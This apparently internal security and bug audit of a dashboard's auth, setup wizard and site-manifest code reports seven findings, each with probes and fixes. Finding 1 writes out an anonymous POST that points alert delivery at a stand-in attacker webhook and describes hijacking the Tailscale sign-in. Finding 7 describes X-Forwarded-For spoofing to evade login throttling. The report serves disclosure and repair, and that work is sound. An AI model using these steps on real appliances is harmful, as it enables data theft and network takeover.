# bug-dash-auth - dashboard auth, sessions, OIDC, local accounts, secrets bootstrap, settings, site manifest, setup wizard, app gates, provision/links/locate/assignments
Files read (approximate coverage): auth.py (100%), sessions.py (100%), oidc.py (100%), local_users.py (100%), secrets_boot.py (100%), settings.py (100%), site_store.py (100%), setup_api.py (100%), setup_routes.py (100%), setup_engine.py (~85%), app.py (~75%: gates, middleware, lifespan, boot refusals), provision.py (100%), links.py (100%), locate.py (100%), assignments.py (100%). Callers followed: db.connect/age_seconds/BUSY_TIMEOUT_*, api.api_admin_disable_user, collector._refresh_shared_folders, api.create_tree_project, companion sync/server_locate.py (both sides of the locate wire).
Tests/probes run (dashboard venv, scratch scripts in %TEMP%, temp databases only):
- sessions probe: `SessionStore.validate` on a row due a touch while another connection holds BEGIN IMMEDIATE -> blocked 21.9 s, then raised `OperationalError: database is locked`.
- site_store probe: save template_folders/shared_asset_folders on a site with no rows, then restore the diff's `from` values the way undo does -> both lists resolve to `[]`.
- site_store probe: `shared_asset_folders = "Assets/Luts,音效"` passes `validate_many`, then `resolved_manifest` raises `ValueError: slugify('音效') produced an empty slug`.
- app probe (TestClient, `DASH_AUTH_METHOD=local`, no accounts): anonymous `POST /api/v1/setup/alerts {"webhook": ...}` -> 200 and the sink is stored (the collector at once tried to deliver to it); anonymous `POST /api/v1/setup/tasks/tailnet/run` and `.../secrets/run` -> 200.

## Findings

### bug-dash-auth-1 - The anonymous first-run window opens EVERY setup route, not only the EULA and create-admin steps
- Severity: high
- Confidence: CONFIRMED
- Where: dashboard/src/ccsync_dashboard/setup_routes.py:97 (`require_setup_access` -> `first_run_open`), used by :164 (`/setup/tasks/{id}/run`), :227 (`/setup/alerts`), :248 (`/setup/alerts/test`), :152, :179, :207
- What: The module docstring says the session-less window exists for "the FIRST two steps (Welcome/EULA, then creating that very admin account)", but `require_setup_access` returns "anonymous OK" for every route under `/api/v1/setup/`. Under `DASH_AUTH_METHOD=local` with no account yet, anybody who can reach the port can run any task's action: set the alert destination (email or webhook), send test alerts to any URL, drive the bundled Tailscale node's `login-interactive` and read back its sign-in URL, and backfill secrets.
- Failure scenario: a fresh appliance is on the LAN before the owner has made the first account. Another host POSTs `/api/v1/setup/alerts {"webhook":"https://attacker/hook"}` - stored, and the collector starts delivering fleet alerts and weekly reports there. Or it POSTs `/api/v1/setup/tasks/tailnet/run`, gets the node's AuthURL in `detail`, and opens it first, joining the appliance's Tailscale node to the attacker's tailnet. With `alerts_smtp_to` set to the attacker's address the server-triage reply channel (which trusts replies From `alerts_smtp_to`) is also theirs once triage is turned on.
- Evidence: TestClient probe above: anonymous alerts POST answered `200 {'status': 'ok', 'detail': 'alerts go to https://attacker.example/...'}` and `alerts.get_settings` then held `webhook https://attacker.example/hook`; tailnet and secrets run answered 200.
- Ledger: new (earlier hunts list the first-run window as not covered: bug-hunt-2026-09-11b security, 2026-09-18 security, 2026-09-18b security)
- Suggested fix: Allow anonymous access only to what the first two steps need (`GET /setup/tasks`, `GET/POST /setup/eula`, `/setup/status`, `/setup/admin`); every other setup route requires an admin session, which the wizard has as soon as setup_admin has run.

### bug-dash-auth-2 - The session "touch" blocks the event loop for up to 20 s and then 500s a valid session
- Severity: medium
- Confidence: CONFIRMED
- Where: dashboard/src/ccsync_dashboard/sessions.py:231-236 (`validate` touch, on `db.BUSY_TIMEOUT_BACKGROUND_MS` = 20 s, under `_write_lock`); called synchronously from the async middlewares app.py:1324 (`login_gate`) and app.py:1091 (`csrf_gate`) via auth.get_session_user / session_is_tracked
- What: `login_gate` is `async def` and calls `auth.get_session_user` inline. Once a minute per session, `SessionStore.validate` issues an UPDATE with a 20 s busy timeout while holding a process-wide threading lock. On the single-worker container this runs on the event loop. When the collector or an `api_report` holds the write lock, the whole loop stops (every companion report, every htmx poll) for up to 20 s. If the lock is still held, `OperationalError` propagates and the signed-in user gets a 500 for a session that is valid. The 20 s timeout was chosen to avoid exactly that 500.
- Failure scenario: an admin's fleet grid polls while the collector's inventory write or a big report holds the lock for more than 20 s. Every request on the dashboard stalls, then the admin gets a 500 page. This is the CR-282F shape (a blocking DB write on the event loop under contention) through a different door.
- Evidence: probe above: `validate()` on a row due a touch, with another connection in BEGIN IMMEDIATE, blocked 21.9 s and raised `database is locked`. Read: app.py:1253 `async def login_gate`, 1324 inline call. sessions.py:235 the touch is inside `with _write_lock`.
- Ledger: related to CR-282F (fixed for the error handler only)
- Suggested fix: Make the touch best effort: short busy timeout (like NOTICE_BUSY_MS), catch `sqlite3.OperationalError` and skip it, since last_seen is refreshed again on the next request. Or resolve the session in the threadpool from the middlewares.

### bug-dash-auth-3 - [ UNDO ] of a site change empties the project template and the shared asset list
- Severity: medium
- Confidence: CONFIRMED
- Where: dashboard/src/ccsync_dashboard/site_store.py:788-789 (`_settings_fallback` returns "" for template_folders / shared_asset_folders), :459 (`diff_against_current` records that "" as `from`), setup_routes.py:435-443 (undo writes the `before` values back with set_many)
- What: For the two csv keys, "no row" means "use provision's defaults" (`_shape` checks `key in db_values`), but the diff records the absent row as `from: ""`. Undoing an import or save that set either key writes an explicit `""` row, and `_shape` then reads an empty list instead of the defaults. The dry-run preview is also misleading, showing `"" -> Footage,Audio` for a site that really has eight template folders.
- Failure scenario: an admin imports a site.toml carrying `template_folders`/`shared_assets`, then presses [ UNDO LAST IMPORT ]. From then on every "create new project" makes an empty project (no AE/Audio/Interviewees/...), and `GET /api/v1/site` publishes `shared_asset_folders: []` to every installer and companion. The collector keeps its old list only because it ignores an empty answer, so the dashboard's own copy and the published manifest disagree.
- Evidence: probe above: before `['AE', ...8]` / `['Assets/Luts','Assets/Stills']`; diff `from: ''`; after restoring the diff's `from` values, `[] []`.
- Ledger: new
- Suggested fix: Make the diff/undo record "no row" as a distinct value (for example None) and have undo DELETE the row for it. At minimum, let `_settings_fallback` return the provision defaults joined for these two keys.

### bug-dash-auth-4 - A shared asset folder whose name has no ASCII letter or digit 500s /api/v1/site and every manifest reader
- Severity: medium
- Confidence: CONFIRMED
- Where: dashboard/src/ccsync_dashboard/provision.py:208 (`slugify(rel)` raises ValueError), reached from site_store.py:570 (`_shape`); the validator site_store.py:239-258 accepts it
- What: `_validate_csv` refuses control characters, absolute paths and `..` but never checks that the rel can become a folder id. An all-CJK (or all-punctuation) name passes validation and is stored. Every later `resolved_manifest` then raises `ValueError`: `GET /api/v1/site` (installers, onboarding, companions), `GET /api/v1/admin/site`, export, `site_store.template_folders` (so project creation), and the setup studio check. Two different rels that slugify to the same id (`Assets/SFX` and `Assets-SFX`) are also accepted and produce duplicate Syncthing folder ids.
- Failure scenario: this studio names folders in Chinese. An admin adds `音效` as a shared asset library on Settings. The save commits, then its own response 500s. From then on every companion's and installer's manifest fetch 500s until someone edits the row through the PUT API.
- Evidence: probe above: `validate_many` returned the value unchanged, `resolved_manifest` raised `ValueError: slugify('音效') produced an empty slug`.
- Ledger: new
- Suggested fix: In `_validate_csv` for `shared_asset_folders`, run `provision.slugify` on each item and refuse ValueError and duplicate ids with a sentence. Also make `shared_asset_folders_for` skip, rather than raise on, a stored bad row.

### bug-dash-auth-5 - Setup reports the admin step done on an OIDC admin claim that grants nothing
- Severity: low
- Confidence: CONFIRMED
- Where: dashboard/src/ccsync_dashboard/setup_engine.py:586-591 (`_check_admin`)
- What: With `DASH_AUTH_METHOD=oidc`, no `DASH_ADMIN_USERS` and `DASH_OIDC_ADMIN_CLAIM` set, the task returns ok ("admins come from your identity provider's ... claim"). `auth.is_admin` never reads claims: oidc.py:499-505 only logs it, and README/CONFIG.md say "logged, not obeyed". The same site's wizard therefore reports a dashboard with no admin as set up.
- Failure scenario: a customer configures the claim, the checklist goes green, and then nobody can reach any admin page. Break-glass `/login?local=1` is also limited to DASH_ADMIN_USERS, which is empty, so the only way back in is a redeploy.
- Evidence: grep: `is_admin_by_claims` is used only by oidc.require_fleet_member and a log line; `auth.is_admin` reads only `settings.admin_users` and local accounts.
- Ledger: new
- Suggested fix: Drop the claim branch, so the task stays `todo` naming DASH_ADMIN_USERS, or say in the detail that the claim is advisory and admin still needs DASH_ADMIN_USERS.

### bug-dash-auth-6 - The boot log misdescribes DASH_COOKIE_SECURE=true/yes/on/false/no/off
- Severity: low
- Confidence: CONFIRMED
- Where: dashboard/src/ccsync_dashboard/auth.py:887 (`describe_auth`)
- What: `cookie_secure()` and `check_boot_secrets` accept `1/true/yes/on` and `0/false/no/off`, but `describe_auth` only maps the literal `"1"`/`"0"`. The boot line for `DASH_COOKIE_SECURE=true` says "Secure follows the request scheme" while the cookie is really forced Secure. That is the one line the docstring says answers "which auth is this box running".
- Failure scenario: an operator debugging a login loop behind plain http reads "follows the request scheme" and rules out the Secure flag, which is the actual cause.
- Evidence: read auth.py:549-553 vs 886-888.
- Ledger: new
- Suggested fix: Normalise with the same truthy/falsy sets `cookie_secure` uses.

### bug-dash-auth-7 - A trusted proxy's X-Forwarded-For is read from the LEFT, which is the client-supplied end
- Severity: low
- Confidence: PLAUSIBLE
- Where: dashboard/src/ccsync_dashboard/auth.py:238 (`client_ip`)
- What: For a peer in DASH_TRUSTED_PROXIES, `client_ip` takes the first comma element of X-Forwarded-For. A proxy that appends (nginx `$proxy_add_x_forwarded_for`, Go's Director-mode ReverseProxy, many sidecars) keeps whatever the client sent at the left. A client can then choose its own login-throttle IP bucket: it can dodge the 40-per-hour IP budget by rotating the value, or fill an innocent address's budget. Tailscale Serve's Rewrite-mode proxy replaces the header and is not affected.
- Failure scenario: a site fronts the dashboard with nginx and adds its address to DASH_TRUSTED_PROXIES as documented. A sprayer sends `X-Forwarded-For: <random>` on each attempt, and the IP budget never trips.
- Evidence: read only; the proxy behaviour is standard but not probed here.
- Ledger: new
- Suggested fix: Walk X-Forwarded-For from the right and take the first address that is not itself a trusted proxy.

## Coverage note
Not reached: setup_engine.py lines 1-300 (registry/state plumbing, read lightly), app.py's exception handler and mount wiring past line 1440, and the ui.py login routes that call into auth (outside this territory; not checked for username case handling on the SMB path). Local-accounts timing (unknown user answers faster than scrypt, so usernames can be enumerated) was noted but not reported: it is low and has been the SMB posture all along.

## OUT OF TERRITORY
- dashboard/src/ccsync_dashboard/api.py:1732 (`api_site`): no fallback when `resolved_manifest` raises, so any bad site_settings row 500s the open manifest for every client (see bug-dash-auth-4). `manifest_for_app` already has the Settings-only fallback this route could reuse.
